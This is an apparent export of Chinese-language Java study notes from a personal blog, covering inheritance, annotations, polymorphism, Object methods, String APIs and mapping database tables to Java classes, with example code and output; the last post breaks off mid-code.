定义管理层类，继承员工类，并有自己的属性职务和年薪。 定义职员类，继承员工类，并有自己的属性所属部门和月薪。 面向对象的字符串统计编写程序统计字符串中 字母n 和 字母o 出现的次数。 方法一：顺序式思考问题，编写 StirngUtil 类，编写 getNumber() 静态方法，传入一个 String 进行便利，输出int[] 数组，存放 n 和 o 出现的次数。 方法二：通过继承，一个 StringUtil 可能还有其他功能，比如统计其他的字母次数，统计单词个数，或者其他的一些统计操作。我们要保证程序的一个可扩展，可兼容性，可复用性。 设计： 父类 StringUtil 是多个字符串处理的父类，它的属性只是一个待处理的字符串。 子类 StirngCount 需要对特定的字符进行计数，所以他自己的一个成员属性，就是字符的个数。 如果需要扩充功能，就只需要再次编写 StringUtil 的特定功能的子类就行，代码结构就比较清晰。 12345678910111213141516171819202122232425262728293031323334353637383940414243class StringUtil &#123; private String content ; public StringUtil(String content) &#123; // 不提供无参构造，则要求子类必须有参才能构造对象。 this.content = content ; &#125; public String getContent() &#123; return this.content ; &#125; public String getInfo() &#123; return this.content ; &#125;&#125;class StringCount extends StringUtil &#123; private int countOfN; private int countOfO; public StringCount(String string) &#123; super(string) ; // 父类没有无参，必须显示调用 this.countLetter() ; // 通过构造方法调用 &#125; public void countLetter() &#123; this.countOfN = 0 ; this.countOfO = 0 ; for(char ch : super.getContent().toCharArray()) &#123; if(ch == &#x27;n&#x27; || ch == &#x27;N&#x27;) this.countOfN ++ ; if(ch == &#x27;o&#x27; || ch == &#x27;O&#x27;) this.countOfO ++ ; &#125; &#125; public String getInfo()&#123; return String.format(&quot;\\&quot;%s\\&quot;中\\n\\tn的个数有：%d;\\n\\to的个数有：%d。&quot;, super.getContent(), this.countOfN, this.countOfO) ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; StringCount strCount = new StringCount(&quot;nNoodsjsdgnlOogenN&quot;); System.out.println(strCount.getInfo()) ; &#125; &#125;/*&quot;nNoodsjsdgnlOogenN&quot;中 n的个数有：5; o的个数有：4。*/ 任何方案都是可以的，第一种方案比较直观，但是第二种比较有利于代码的一个维护。 程序只用到了子类和子类的方法，父类完全没用，只是为了程序的一个扩展和维护而已。 数组操作 要求 建立一个可以实现整数数组的操作类(Array)，而后在里面可以操作的数组大小由外部来决定，而后在 Array类里面提供数组如下处理： * 进行数据的增加，如果数据满了则无法增加； * 可以进行扩充和获取数组全部内容； 再次基础上派生两个子类： 数组排序：返回的数据要是排序后的结果。 数组反转：首位内容的交换。 父类所定义的方法往往都很重要，如果功能相同子类往往以覆写父类的方法为主，而不是另外写一个方法。 数组最基本的一些必要操作封装为父类，比如数组的建立，扩充，和添加元素； 数组的一些非必要的操作，封装为子类，继承父类的同时，提供排序、逆序等操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class Array &#123; private int[] array ; private int num ; public Array(int length) &#123; if(length &lt;= 0) this.array = new int[0] ; else this.array = new int[length] ; this.num = 0 ; &#125; public boolean add(int value) &#123; if(this.num &lt; this.array.length) this.array[this.num ++] = value ; else return false ; return true ; &#125; public void expand(int length) &#123; int[] arrayNew = new int[this.array.length + length] ; System.arraycopy(this.array, 0, arrayNew, 0, this.array.length) ; this.array = arrayNew ; &#125; public int[] getArray() &#123; return this.array ; &#125; public String getInfo() &#123; return java.util.Arrays.toString(this.array) ; &#125;&#125;class ArraySort extends Array &#123; public ArraySort(int length) &#123; super(length) ; &#125; public void arraySort() &#123; java.util.Arrays.sort(super.getArray()) ; &#125; public String getInfo() &#123; return super.getInfo() ; &#125;&#125;class ArrayRev extends Array &#123; public ArrayRev(int length) &#123; super(length) ; &#125; public void arrayRev() &#123; int center = super.getArray().length / 2 ; int head = 0 ; int tail = super.getArray().length - 1 ; int temp ; for(int i = 0; i &lt;= center; i++) &#123; temp = super.getArray()[head] ; super.getArray()[head] = super.getArray()[tail] ; super.getArray()[tail] = temp ; head ++ ; tail -- ; &#125; &#125; public String getInfo() &#123; return super.getInfo() ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; ArrayRev ary = new ArrayRev(5) ; System.out.println( ary.add(1) ) ; System.out.println( ary.add(8) ) ; System.out.println( ary.add(5) ) ; System.out.println( ary.add(4) ) ; System.out.println( ary.add(9) ) ; System.out.println( ary.add(2) ) ; ary.expand(2) ; System.out.println( ary.add(2) ) ; /* true true true true true false true */ // ary.arraySort() ; // System.out.println(ary.getInfo()) ; // [0, 1, 2, 4, 5, 8, 9] System.out.println(ary.getInfo()) ; // [1, 8, 5, 4, 9, 2, 0] ary.arrayRev() ; System.out.println(ary.getInfo()) ; // [0, 2, 9, 4, 5, 8, 1] &#125;&#125; Annotation注解概念​ JDK1.5 之后提出的一个新的技术开发结构，==利用Annotation减少程序配置的代码==，并且利用Annotation 进行一些结构化的定义。 ​ Annotation 是以一种注解的形式实现的程序开发，可以简化大量的代码。 产生意义 程序开发过程 现在的程序开发，实际上是一种资源的配置：一种基于网络形式的开发，程序是一个组合过程。开发过程中需要获取各种服务器的一些资源，也就需要各种资源的一些配置。 过程一：程序开发过程中，所有的配置全部写在程序之中。 缺陷，一定需要修改配置，那么维护就不方便。 过程二：引入配置文件，将所有的资源配置，都写到配置文件之中，程序启动过程中，去读取配置文件。 优点，配置不多的情况下，该方式十分好用。 缺点，配置过多的欠款下，配置文件暴多。所有的操作都需要依赖配置文件，增加了开发的难度。 过程三：配置重新回到程序里面，利用一些特殊的标记与程序代码进行分离，这就是==注解==的作用。 基本注解： 123@Override@Deprecated@SuppressWarnings 准确覆写@Override 进行覆写的时候，常见错误： 忘记给类加 extends 继承，此时进行覆写操作，程序编译不会报错，实际上并没有重写成功。 方法多次拼写错误，此时进行覆写，程序编译也不会报错，误认为是一个新的方法定义。 解决方案： 在明确有一个覆写操作的情况下。 在覆写方法前面==添加一个 @Overide 注解。此时如果没有覆写成功，程序编译的时候会进行检查报错。== 过期操作 @Deprecated​ 在一个软件项目的迭代开发过程之中哦，可能有某一个方法或类，在最初设计的时候不周（存在有缺陷），导致新版本的应用会有不适应的地方（老版本不影响），但是这个时候又不能直接删除修改，采用一种过渡期进行淘汰。 ​ 已经在用的人不受影响，但是提醒新的开发人员，采用新的替换方法。 ​ 该注解所对应的方法或者类，在程序编译式会发出==过期警告，但是仍然能够执行。== 作用： 如果不采用这种柔和的过渡期，那么新版本出现，将会对老版本重构带来困难。 比如一些开源项目，很多版本更新并没有采用这种方式，对于使用的人来说比较麻烦。 压制警告@SuppressWarnings​ 程序设计过程中，对于一些明确的警告，如果不想要编译器重复进行提示，就可以使用该注释信息进行注释。 @SuppressWarnings(&#123;&quot;deprecation&quot;&#125;) ==所有这些 Annocation 注解信息，都可以通过 IDE 进行快捷添加，不需要记忆。== 多态概念​ 在继承的基础之上，扩充出来的概念。 方法的多态 ==方法的重载==，同一个方法名称，根据传入的参数不同，实现不同功能。重载就是一种多态性。 ==方法的覆写==，根据所处类型不同，子类中的同一个方法，具有不同的作用。子类方法的覆写也是一种多态性。 对象的多态：父子实例之间的转换 ==对象向上转型==：子类实例化对象，交付给父类引用变量。==自动完成转换==； 实际开发过程中，90% 情况下，考虑的是向上转。 对象向下转型：父类实例化对象，交付给子类引用变量。==强制完成转换==。 往往使用子类的特殊功能的时候（子类对父类功能进行扩充），需要下转。 向上转型 只需要关注new的实例化对象是什么类型 和 该类的方法是否被覆写成功。 向上转后，==子类覆写父类的方法，仍然可以正常使用。== ==但是，不能使用原来子类的特有方法==；如果要用需要再次向下转型。 ==作用==： ==对参数进行统一的设计==：方法使用父类的参考，可以接受任何子类的对象。 当子类对象非常多的时候，不可能通过根据不同类型，重载方法。 12345678910111213141516171819202122232425class Message &#123; public void print() &#123; System.out.println(&quot;输出一个信息！&quot;) ; &#125;&#125;class DateBaseMessage extends Message &#123; @Override public void print() &#123; System.out.println(&quot;数据库信息！&quot;) ; &#125;&#125;class WebServerMessage exgends Message &#123; @Override public void print() &#123; System.out.println(&quot;网站服务信息！&quot;) ; &#125;&#125;&#123; fun( new DateBaseMessage() ) ; fun( new WebServerMessage() ) ; // 同一个方法可以不通过重载，接受不同类型对象 public static void fun(Message msg) &#123; msg.print() ; &#125;&#125; 向下转型 ==发生向下转型之前，必须先发生向上转型==，如果是原来只是父类的对象，强转成子类，会发生 ClassCastException 异常。 引用数据类型，==向下转型不安全。== ==当需要子类特殊定义的功能==的时候，需要使用到向下转型。 1234567891011121314151617181920212223242526class Person &#123; public void print() &#123; System.out.println(&quot;吃饭、睡觉、打豆豆！&quot;) ; &#125;&#125;class SupMan extends Person &#123; public void fly() &#123; System.out.println(&quot;飞！&quot;) ; &#125; public void fire() &#123; System.out.println(&quot;喷火！&quot;) ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Person per1 = new SupMan() ; Person per2 = new Person() ; System.out.println(&quot;某一天发生怪兽入侵！&quot;) ; SupMan supMan1 = (SupMan)per1; supMan1.fly() ; supMan1.fire() ; SupMan supMan2 = (SupMan)per2 ;// 执行异常 &#125;&#125; instanceof 关键字实例对象 instanceof 类名：返回 boolean 类型，判断对象是否是类的一个实例。 原来是子类的实例化对象，==即使向上转型后，仍然属于父类 和 原子类的对象，本质不变==。 因此，==如果要向下转型，提前需要判断该对象是否属于所转子类的对象。== 12345678910111213141516171819202122232425public class Hello &#123; public static void main(String[] args) &#123; Person per1 = new Person() ;// 普通人类 Person per2 = new SupMan() ;// 隐藏的超人 System.out.println(per1 instanceof Person) ; System.out.println(per1 instanceof SupMan) ; System.out.println(per2 instanceof Person) ; System.out.println(per2 instanceof SupMan) ; if(per2 instanceof SupMan) &#123; SupMan supman = (SupMan)per2 ; supman.fire() ; supman.fly() ; &#125; &#125;&#125;/*truefalsetruetrue喷火！飞！*/ Object类Object类是所有类的父类，==可以解决参数统一问题，使用Object类型作为参数，可以接受所有类型的对象参数==。 由于Object类的特殊性，它本身所提供的一些方法，被所有的类所继承，因此对于这些方法，==需要熟练掌握：toString()、equals()、notify()、notifyAll()……== 简介Object 是一个普通类，提供有无参构造，因此其他类可以继承他的同时，默认调用了Object的无参构造。 如果一个方法可以接受如何类型，就可以使用 Object 类型作为形参； ==Object 也可以接受数组对象==。数组虽然不是类，但是也是引用数据类型。 123456789public class Hello &#123; public static void main(String[] args) &#123; Object obj = new int[] &#123;1, 2, 3&#125; ; if(obj instanceof int[]) &#123; int[] array = (int[]) obj ; System.out.println( java.util.Arrays.toString(array) ) ; &#125; &#125;&#125; 获取对象信息toString() 使用 println 直接输出的时候，默认调用的就是 Object 的 toString() 方法。 ==以后开发过程中，可以直接覆写该 toString() 方法==。就可以直接适用于 println。 以后编写简单java类，可以直接覆写 toString 代替 getInfo() 方法 1234567891011121314151617181920class Person &#123; private String name ; private int age ; public Person() &#123;&#125; public Person(String name, int age) &#123; this.name = name ; this.age = age ; &#125; @Override public String toString() &#123; return String.format(&quot;姓名：%s; 年龄：%d&quot;, this.name, this.age) ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Person per = new Person(&quot;张三&quot;, 18) ; System.out.println( per ) ; &#125;&#125; 对象比较equals()主要是==比较两个对象的内容是否相同==。 该功能实际开发过程中，equals() 使用得比较多。 默认 Object 类底层代码：只比较了地址。 123public boolean equals(Object obj) &#123; return (this == obj) ;&#125; 对于使用者而言，如果需要准确进行判断，==需要覆写 equals() 方法==。 判断传入的 Object 对象==是否为空==； 判断==是否为同一个类==； 判断==是否是同一个对象==； Object 向下转后，对比各个==字段值相等==。 完整的比较覆写如下： 12345678910111213141516171819202122232425262728293031323334353637class Person&#123; private String name ; private int age ; public Person() &#123;&#125; public Person(String name, int age) &#123; this.name = name ; this.age = age ; &#125; @Override public boolean equals(Object obj) &#123; if (obj == null) // 传入空 return false ; if (!(obj instanceof Person)) // 传入其他类型 return false ; if (this == obj) // 同一地址 return true ; Person per = (Person)obj ; return this.name.equals(per.name) &amp;&amp; (this.age == per.age) ; &#125; @Override public String toString() &#123; return &quot;姓名：&quot; + this.name + &quot;; 年龄：&quot; + this.age ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Person per1 = new Person(&quot;张三&quot;, 18) ; Person per2 = new Person(&quot;张三&quot;, 18) ; Person per3 = new Person(&quot;李四&quot;, 16) ; System.out.println(per1.equals(per2)) ; // true System.out.println(per1.equals(per3)) ; // false System.out.println(per1.equals(per1)) ; // true System.out.println(per1.equals(&quot;王五&quot;)) ; // false System.out.println(per1.equals(null)) ; // falsea e3 &#125;&#125;","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"String","date":"2021-11-10T14:08:30.000Z","path":"2021/11/10/2021.11.10 String/","text":"String 简介String 类严格意义上不属于一个基本数据类型，如何一门语言都没有提供字符串类型。java 中只利用了JVM的支持，制造了可以简单使用 + 号运算的 String 类。 String 里面可以保存字符串，主要是因为里面包含有一个数组，所有的字符串都是保存到String类中的数组当中的。 JDK 1.9 之后对于 String 相关类的定义更多了。 JDK 1.8 之前保存的是字符数组 JDK1.9以后String保存的是byte数组 private final char value[] ; private final byte value[] ; String 本身包装的是一个数组，两种实例化现实：直接赋值、构造方法。 public String(String str)&#123;&#125; String 使用字符串比较 两种比较方法： str1 == str2 str1.equals(str2) 区别 == 是同引用数据类型，比较两个参考变量是否绑定到同一个对象； equals() 直接比较两个字符串内的值，是否相同。 注意： 直接赋值，在常量池（堆区的一个数组）实例化对象，一次创建多次重用同一个对象。 构造实例化对象，在堆区，常量池外开辟内存空间。 但是如果使用 equals() 方法，就直接是把 String 中的内容拿出来比较。==通常使用都是使用 equals() 进行比较==。 1234567String str1 = &quot;123&quot; ;String str2 = &quot;123&quot; ;String str3 = new String(&quot;123&quot;) ;/**str1 == str2str1 != str3**/ 字符串常量 所有使用 “ “ 双引号引起来的字符串，都是一个 String 类型的==匿名对象==。 也就是没有分配对象名称的实例化对象。 既然是对象，就可以使用 String 类型的方法。 如果给他绑定一个参考变量，那就是创建在常量池中保存下来。 如果没有绑定，那就会被垃圾回收。 1234&#123; String str = &quot;123&quot; ; System.out.println( &quot;123&quot;.equals(str) ) ; // true;&#125; 小应用 如果要对比一个字符串和一个字符串常量，可以将==常量写到前面==，这样永远不可能发生空指针异常。 1234&#123; String input = new Scanner(System.in).next() ; System.out.println( &quot;123&quot;.equals(input) ) ; // 这样子即使 input 为 null 也不会报错，返回 false&#125; 内存分析两种实例化赋值语句实例化 String 类池 内存分析：在堆区弄个数组，然后一次创建，多次重用同一个对象； 123456&#123; String strA = &quot;mldn&quot; ; String strB = &quot;mldnjava&quot; ; String strC = &quot;mldn&quot; ; System.out.println(strA == strC) ; // true &#125; 构造方法实例化 String str = new String(&quot;mlnd&quot;) 实例化了两个对象；堆区保存一个被创建的对象，还额外生成了 &quot;mlnd&quot; 这个匿名对象，变成垃圾空间。 手工入池，将使用构造方法实例化的字符串，手动放到常量池； String str = new string(&quot;123&quot;).intern() ; 等价于 String str = &quot;123&quot; ; 12345&#123; String str = new String(&quot;123&quot;).intern() ; String str2 = &quot;123&quot; ; System.out.println(str == str2) ; // true&#125; 总结 直接赋值：只会产生一个实例化对象，并且可以自动保存在对象池之中，以实现该字符串的重用； 构造方法：会产生==两个实例化对象==，并且不会自动入池，无法实现对象重用，但是可以调用 intern() 方法实现手工如池。 尽量使用直接赋值更为简单、高效； 常量池 常量池的内容就是为了重用，也就是共享信息。 静态常量池：程序（.class）文件在加载的时候自动将程序中保存的字符串、普通常量、类、方法的信息等等，全部进行分配；==全部静态的东西，在程序加载的时候就处理好了== 运行时常量池：程序（.class）运行的时候，里面一些变量，生成的常量池。 注意： 静态：就是程序编译完(.class)，加载的时候，就能够知道的一些信息，则是静态的； 动态：必须等到程序运行，经过处理才能得到的信息，则是动态的； 如果保存的两个池子不一样，那么即使都在常量池，那也不等。 12345678&#123; // 静态常量池 String str1 = &quot;123&quot; ; String str2 = &quot;123456&quot; ; String strStatic = &quot;123&quot; + &quot;456&quot; ; // 与 str2 == String strRunTime = str1 + &quot;456&quot; ; // 与 strStatic != String strRunTime2 = str1 + &quot;456&quot; ; // 与 strRunTime !=/** 使用变量进行字符串连接，返回了一个新的堆区字符串。&#125; 字符串修改分析==字符串长度不可修改==，String低层 JDK1.9以后使用的是 byte 数组实现的，一旦实例化，长度不可更改。 平常使用的加号连接，每次操作参考变量，都重新指向了一个新的实例化String对象，原来的实例空间变成匿名垃圾空间**。 ==String类实例的内容，开发过程中，不能进行频繁的改变，否则将产生大量垃圾空间；== 123String str = &quot;0&quot;;for(int i = 1; i &lt;= 100; i++) str += i ; 主方法解析 public : 主方法是程序起点，必然是公开的； String[] args：接收程序启动参数；如果，参数本身包括空格，那么整体需要使用 “ “ 双引号进行传入。 C 语言main方法参数( int argc, char* argv[] )，是一个指向char类型的指针数组。可执行文件 参数1 参数2，则 argc = 3，argv[0] = “可执行文件”，argv[1] = “参数1”。 1234567public class Hello &#123; public static void main(String[] args) &#123; for(String str : args) &#123; System.out.println(str) ; &#125; &#125;&#125; String 常用方法java.lang.String; JavaDoc 文档查看 JDK1.9以后API文档 JDK 1.9 以前的文档，都是直接使用包的概念，来进行划分，查询。 JDK 1.9 以后的文档，按照模块化进行分类查找。模块当中，才包含包，按照包进行分类查看。 比如查看 String 类，找 Base模块-java.lang包-String类； 内容： 类的完整定义； 类的相关说明信息； 成员属性（Fields-字段）摘要； 构造（Structure）方法摘要；- Deprecated已弃用，不能再使用该方法； 方法摘要；左边返回值，右边方法名，详细说明； java 文档有很多机械翻译的中文文档，建议不看，以后项目开发很多文档都是没有中文翻译的。现在就要开始习惯。 字符串与字符数组转化 字符数组 转 字符串 new String(char[]) 构造，整体转化； new String(char[], int offset, int count) 构造，部分转化。 Arrays.toString(char []) 1234char[] charArray = &quot;123456789&quot;.toCharArray() ; System.out.println(new String(charArray) ) ; System.out.println( Arrays.toString(charArray) ) ;// [1, 2, 3, 4, 5, 6, 7, 8, 9] 字符串 转 字符 str.charAt(pos) ：单个获取； str.toCharArray() ：整体转。 字符串与字节数组转化 字节数组 转 字符串 new String(byte[])：构造，整体转； new String(byte[], int offset, int count)：构造，部分转化； ==字符串 装 字节数组== str.getBytes() ：普通方法，整体转化； str.getBytes(String charsetName)：传入编码名称，进行编码转化，重要，常用于字节传输和编码。 字符串转数字 类型 语句 int Integer.parseInt(String str) float Float.parseFloat(String str) double Double.parseDouble(String str) 数字转字符串 类型 语句 double t Double.toString(t)，基本数据类型没有toString用包装类的静态方法 double t String.valueOf(t)，手动装箱 double t t + “”，字符串连接符，加一个空串 字符串比较字符串值的相同比较，内容的大小比较。 不区分大小写的比较 str1.equalsIgnoreCase(str2); ==进行字符串大小比较，重要== int str1.comparaTo(str2)：普通，==返回 int 数据==，逐个进行字母比较。 &gt;0 返回 str1 - str2 的差值，mldn - mldN = 32，第一个不等的字母之间的 ASCLL 差值。 &lt;0 前者小于后者 =0 int str1.comparaToIgnoreCase(str2)：普通，不计较大小写。mldn = MlDN 字符串查找 判断子串是否存在 boolean str1.contains(str2) ：JDK1.5以后找子串是否存在。 int str1.indexOf(str2)：之前的JDK，==返回子串出现的位置（常用）==。查不到-1 int str1.indexOf(str2, fromIndex) int str1.lastIndexOf(str2) ：从后往前找子串。 int str1.lastIndexOf(str2, fromIndex) contains() 比较简洁，IndexOf() 可以做一些索引任务； 可从前往后，也可从后往前；也可重载，从指定位置开始。 ==判断字符串起始、结尾（常用）== boolean str1.startWith(str2)：是否以该字符串起始。 boolean str1.startWith(str2, offset) boolean str1.endWith(str2)：是否以该字符串结尾。 字符串替换指定内容，做指定替换。 格式 类型 作用 public String replaceAll(==String regex==, String replacement) 普通 全部替换 public String replaceFirst(==String regex==, String replacement) 普通 替换首个 在开发过程当中，或者设计过程当中，替换十分重要的； 并且，所需要替换的==regex==常常使用==正则表达式==进行匹配。 字符串拆分根据指定的字符串，或者是表达式（正则表达式），进行字符串拆分，并且拆分得到的数据，将进行字符串数组进行返回。 格式 类别 作用 public String[] split(String regex) 普通 对字符串按照regex进行拆分 public String[] split(String regex, int limit) 普通 只拆 limit 次 在进行拆分的时候，遇到拆分不了的情况。==这个时候要使用双斜线进行转义处理！== 字符串截取从一个完整的字符串当中，截取出子字符串。 格式 类别 作用 public String substring(int beginIndex) 普通 从begin到最后，得到子串 public String substring(int beginIndex, int endIndex) 普通 从范围内的字符串 简单应用 从一个文件名中截取有用信息字段。 1234567891011121314151617public class Hello &#123; public static void main(String[] args) &#123; String str = &quot;物联网工程-1801-541807090107-方宁.docx&quot; ; // 区间范围不包括 endIndex System.out.println( str.substring( 0, str.indexOf(&quot;-&quot;) ) ) ; System.out.println( str.substring( str.indexOf(&quot;-&quot;) + 1, str.indexOf(&quot;-&quot;, str.indexOf(&quot;-&quot;)+1 ) ) ); System.out.println( str.substring( str.indexOf(&quot;1801-&quot;) + 5, str.lastIndexOf(&quot;-&quot;) ) ) ; System.out.println( str.substring( str.lastIndexOf(&quot;-&quot;)+1, str.lastIndexOf(&quot;.&quot;) ) ) ; &#125;&#125;/*物联网工程1801541807090107方宁*/ 格式化字符串就是 C 语言中的 print() 参数中，添加格式化字符串，进行字符串的输出。 根据指定结构进行文本的格式化输出。 类型返回值 参数 作用 static String format(String format, Object... args) 将可变参数按照 format 进行格式化 1234567891011public class Hello &#123; public static void main(String[] args) &#123; String name = &quot;张三&quot; ; int age = 21 ; double grade = 89.5 ; System.out.println( String.format(&quot;姓名：%s；年龄：%d；成绩：%.2f&quot;, name, age, grade) ) ; &#125;&#125;/*姓名：张三；年龄：21；成绩：89.50*/ 其他 返回 方法 作用 public String concat(str) 字符串后面连接str public boolean isEmpty() 判断是否为空””，非null public String trim() 去除字符串前后的空格，不去除中间 public String toUpperCase() 转大写（不转非字母） public String toLowerCase() 转小写(不转非字母) 自定义一个首字母转大写的类（只一个单词）。 12345678class StringUtil &#123; public static String initcap(String str) &#123; if(str == null || &quot;&quot;.equals(str)) return str ; if(str.length() == 1) return str.toUpperCase() ; else return str.substring(0, 1).toUpperCase() + str.substring(1) ; &#125;&#125;","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"数据表映射简单java类","date":"2021-11-09T13:58:30.000Z","path":"2021/11/09/2021.11.09 数据表映射简单java类实战/","text":"数据表与java类概念 对于实际的开发当中，简单 java 类的定义是有依据的，根据数据表的结构进行简单 java 类的实现。 数据库中提供有若干个数据表，每一张实体数据表（还有关系数据表），都描述了实体的概念。比如教师表、学生表、员工表 … 关联 程序类的设计和数据表的设计具有以下映射关系： 数据实体表设计 = 类的定义 ； 表中字段 = 类中属性 ； 表的外键关联 = 引用关联 ； 表中一行记录 = 类中一个实例化对象 ； 表的多行记录 = 类中的对象数组。 以后的项目开发过程中，简单 java 类不可能让你随意定义，而是需要按照数据表来进行定义！ 数据表的关系之中有如下关联： 一个部门有多个雇员 ； 一个雇员属于一个部门 ； 一个雇员有一个领导 ； 要求 ==程序有两部分，一部分用来设置数据，一部分用来获取数据==，现在要去设计一个简单 java 类，要求能够： 根据部门信息，获得： 一个部门的完整信息 ； 一个部门之中所用雇员的完整信息。 根据雇员信息，获得： 雇员所在部门 ； 一个雇员对应的领导信息。 处理方案==解决步骤：== 先抛开所用的数据表的外键字段（关联字段）不看，先设计出类的基本组成，然后再通过引用，实现关联字段的配置！ 第一步：分别定义 Dept、Emp 两个实体类； 第二步：配置所有的关联字段； 编写步骤实际项目开发过程中，通过两个步骤进行实现： 步骤1：根据表的结构关系进行对象配置 声明并实例化对象 ； 设置对象之间的引用关系属性 。 步骤2：通过数据表结构获取数据信息 通过上下级关系，能够互相获得关系信息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149class Dept &#123; private long dptno ; private String dname ; private String loc ; private Emp[] emp ; public Dept() &#123;&#125; public Dept(long dptno, String dname, String loc) &#123; this.dptno = dptno ; this.dname = dname ; this.loc = loc ; &#125; public void setDptno(long dptno) &#123; this.dptno = dptno ; &#125; public void setDname(String dname) &#123; this.dname = dname ; &#125; public void setLoc(String loc) &#123; this.loc = loc ; &#125; public long getDptno() &#123; return this.dptno ; &#125; public String getDname() &#123; return this.dname ; &#125; public String getLoc() &#123; return this.loc ; &#125; public void setEmp(Emp ... emp) &#123; this.emp = emp ; &#125; public Emp[] getEmp() &#123; return emp ; &#125; public String getInfo() &#123; return &quot;【部门编号】：&quot; + this.dptno + &quot;、【部门名称】：&quot; + this.dname + &quot;、【部门名称】：&quot; + this.loc ; &#125;&#125;class Emp &#123; private long empno ; private String ename ; private double salary ; private Dept dept ; private Emp mrg ; public Emp() &#123;&#125; public Emp(long empno, String ename, double salary) &#123; this.empno = empno ; this.ename = ename ; this.salary = salary ; &#125; public void setEmpno(long empno) &#123; this.empno = empno ; &#125; public void setEname(String ename) &#123; this.ename = ename ; &#125; public void setSalary(double salary) &#123; this.salary = salary ; &#125; public long getEmpno() &#123; return this.empno ; &#125; public String getEname() &#123; return this.ename ; &#125; public double getSalary() &#123; return this.salary ; &#125; public void setDept(Dept dept) &#123; this.dept = dept ; &#125; public Dept getDept() &#123; return this.dept ; &#125; public void setMrg(Emp mrg) &#123; this.mrg = mrg ; &#125; public Emp getMrg() &#123; return this.mrg ; &#125; public String getInfo() &#123; return &quot;【雇员编号】：&quot; + this.empno + &quot;、【雇员姓名】：&quot; + this.ename + &quot;、【雇员工资】：&quot; + this.salary ; &#125;&#125;public class Hello &#123; public static void main(String args[]) &#123; // 步骤1，声明定义初始化，设置关联属性 Dept dept = new Dept(1314, &quot;IT部&quot; , &quot;上海&quot;) ; Emp manager = new Emp(1314001, &quot;方宁&quot;, 15000.00) ; Emp emp1 = new Emp(1314002, &quot;张三&quot;, 8000.00) ; Emp emp2 = new Emp(1314003, &quot;李四&quot;, 9000.00) ; Emp emp3 = new Emp(1314004, &quot;王五&quot;, 3000.00) ; dept.setEmp(new Emp[]&#123;manager, emp1, emp2, emp3&#125;) ; manager.setDept(dept) ; emp1.setDept(dept) ; emp2.setDept(dept) ; emp3.setDept(dept) ; emp1.setMrg(manager) ; emp2.setMrg(manager) ; emp3.setMrg(manager) ; //步骤2，获取关联信息 System.out.println(&quot;【部门信息】&quot; + dept.getInfo()) ; for(Emp emp : dept.getEmp()) &#123; System.out.println(&quot;\\t-【雇员信息】&quot; + emp.getInfo()) ; if(emp.getMrg() != null) System.out.println(&quot;\\t\\t-【领导信息】&quot; + emp.getMrg().getInfo()) ; else System.out.println(&quot;\\t\\t-【领导信息】无领导&quot;); System.out.println() ; &#125; System.out.println(&quot;-------------------------------------------&quot;); System.out.println(&quot;【所属部门】：&quot; + manager.getDept().getInfo()) ; System.out.println(&quot;【上级领导】：&quot; + emp1.getMrg().getInfo()) ; &#125;&#125;/*【部门信息】【部门编号】：1314、【部门名称】：IT部、【部门名称】：上海 -【雇员信息】【雇员编号】：1314001、【雇员姓名】：方宁、【雇员工资】：15000.0 -【领导信息】无领导 -【雇员信息】【雇员编号】：1314002、【雇员姓名】：张三、【雇员工资】：8000.0 -【领导信息】【雇员编号】：1314001、【雇员姓名】：方宁、【雇员工资】：15000.0 -【雇员信息】【雇员编号】：1314003、【雇员姓名】：李四、【雇员工资】：9000.0 -【领导信息】【雇员编号】：1314001、【雇员姓名】：方宁、【雇员工资】：15000.0 -【雇员信息】【雇员编号】：1314004、【雇员姓名】：王五、【雇员工资】：3000.0 -【领导信息】【雇员编号】：1314001、【雇员姓名】：方宁、【雇员工资】：15000.0-------------------------------------------【所属部门】：【部门编号】：1314、【部门名称】：IT部、【部门名称】：上海【上级领导】：【雇员编号】：1314001、【雇员姓名】：方宁、【雇 员工资】：15000.0*/ 其它 实际的项目开发过程中，这种类的关联设计十分重要，需要非常熟练的掌握。 程序设计的过程中，类的设计至关重要。而，如果需要在大型项目系统中，处理好各种群体之间的关系，就需要具备优秀的数据库设计能力。数据库不仅仅是用来存储数据的，它的设计奠定了整个程序开发的基础架构。初级数据库开发工程师可能只会运用，而高级的数据库开发工程师需要精通数据库系统概念理论，才能设计高效实用的数据库架构。 一对多 按照数据表的要求，转化为类结构，同时要求获取如下信息： 获取一个分类的完整信息； 根据分类，获取其对应所用子分类的信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Item &#123; private long id ; private String name ; private SubItem[] subItem ; public Item() &#123;&#125; public Item(long id, String name) &#123; this.id = id ; this.name = name ; &#125; public void setSubItem(SubItem[] subItem) &#123; this.subItem = subItem ; &#125; public SubItem[] getSubItem() &#123; return this.subItem ; &#125; // getter, setter 略 public String getInfo() &#123; return &quot;【类编号】：&quot; + this.id + &quot;、【类别名】：&quot; + this.name ; &#125;&#125;class SubItem &#123; private long id ; private String name ; private Item item ; public SubItem() &#123;&#125; public SubItem(long id, String name) &#123; this.id = id ; this.name = name ; &#125; public void setItem(Item item) &#123; this.item = item ; &#125; public Item getItem() &#123; return this.item ; &#125; // getter, setter 略 public String getInfo() &#123; return &quot;【子类编号】：&quot; + this.id + &quot;、【子类名称】：&quot; + this.name ; &#125;&#125;public class Hello &#123; public static void main(String[] args) &#123; Item item = new Item(1000L, &quot;主类别&quot;) ; SubItem[] SubItems = new SubItem[]&#123; new SubItem(1001L, &quot;子类1&quot;) , new SubItem(1002L, &quot;子类2&quot;) , new SubItem(1003L, &quot;子类3&quot;) &#125; ; item.setSubItem(SubItems); SubItems[0].setItem(item) ; SubItems[1].setItem(item) ; SubItems[2].setItem(item) ; System.out.println(item.getInfo()) ; for ( SubItem subItem : item.getSubItem() ) &#123; System.out.println(&quot;\\t|&quot; + subItem.getInfo()) ; 